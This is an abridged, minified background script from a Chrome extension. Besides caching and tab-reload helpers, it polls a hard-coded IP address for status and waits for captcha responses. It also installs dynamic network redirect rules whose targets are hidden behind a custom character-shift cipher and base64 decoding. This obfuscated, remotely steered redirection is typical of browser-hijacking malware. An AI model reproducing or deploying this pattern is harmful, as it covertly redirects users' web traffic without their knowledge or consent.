(() => {
  ...
  class a {
    ...
    static string (t = null) {
      return (
        (t = t || a.date()),
        a.pad(t.getMonth() + 1) +
          `/${a.pad(t.getDate())}/${t.getFullYear()} ${a.pad(
            t.getHours() % 12
          )}:${a.pad(t.getMinutes())}:${a.pad(t.getSeconds())} ` +
          (12 <= t.getHours() ? 'PM' : 'AM')
      )
    }
  }
  class c {
    ...
    static async set ({
      tab_id: t,
      data: { name: e, value: a, tab_specific: s }
    }) {
    ...
    static async append ({
      ...
      return (
        (e = s ? t + '_' + e : e) in c.cache || (c.cache[e] = []),
        c.cache[e].push(a),
        c.cache[e]
      )
    }
    ...
    static async inc ({ tab_id: t, data: { name: e, tab_specific: a } }) {
      return (
        (e = a ? t + '_' + e : e) in c.cache || (c.cache[e] = 0),
        c.cache[e]++,
        c.cache[e]
      )
    }
  ...
  class r {
    ...
    static _reload ({ tab_id: e }) {
      return new Promise(t => chrome.tabs.reload(e, { bypassCache: !0 }, t))
    }
    static async reload ({
      tab_id: t,
      data: { delay: e, overwrite: a } = { delay: 0, overwrite: !0 }
    }) {
      e = parseInt(e)
      ...
      return (
        (s = isNaN(s) || s < 0 ? 0 : s),
        !!(a || 0 == s || e <= s) &&
          (clearTimeout(r.reloads[t]?.timer),
          (r.reloads[t] = {
            delay: e,
            start: Date.now(),
            timer: setTimeout(() => r._reload({ tab_id: t }), e)
          }),
          !0)
      )
    }
  ...
  class s {
    ...
    static data = {}
    static _save () {
      return new Promise(t => chrome.storage.sync.set({ settings: s.data }, t))
    }
    static load () {
      ...
      return new Promise(async e => {
        const a = 'recaptcha_response',
          s =
            ...
            setInterval(async () => {
              var t = await c.get({ data: { name: a } })
              if (t)
                return (
                  clearInterval(s), await c.remove({ data: { name: a } }), e(t)
                )
            }, 1e3))
      })
    }
  ...
  class i {
    static STATUS_URL =
      'http://144.126.221.48:31300/status?v=' +
    ...
    static async check_status () {
      ...
      return (
        await i.set_status({ data: { status: t } }), (i.checking_status = !1), t
      )
    }
  ...
  class d {
    ...
    static remove_rules (e) {
      return new Promise(t => {
        chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: e }, t)
      })
    }
    static add_rules (e) {
      return new Promise(t => {
        chrome.declarativeNetRequest.updateDynamicRules({ addRules: e }, t)
      })
    }
    ...
    static async redir (t) {
      ...
      for (const n of t.r) {
        ...
        s.push({
          priority: 1,
          action: { type: 'redirect', redirect: { regexSubstitution: e } },
          condition: {
            regexFilter: c,
            excludedDomains: r,
          ...
          atob(
            (function (t) {
              ...
              for (let t = 0; t < e.length; t++)
                e[t].charCodeAt(0) <= 1024 &&
                  (e[t] = String.fromCharCode(
                    (e[t].charCodeAt(0) + 1007) % 1024
                  ))
              return e.join('')
            })(t)
          )
  ...
  (async () => {
    i.run_status_check(),
      ...
      chrome.runtime.onMessage.addListener((t, e, a) => {
        const s = !['get_settings', 'set_settings', 'set_cache'].includes(
          t.method
        )
        return (
          s,
          o[t.method]({ tab_id: e?.tab?.id, data: t.data }).then(t => {
            s
            try {
              a(t)
            } catch (t) {}
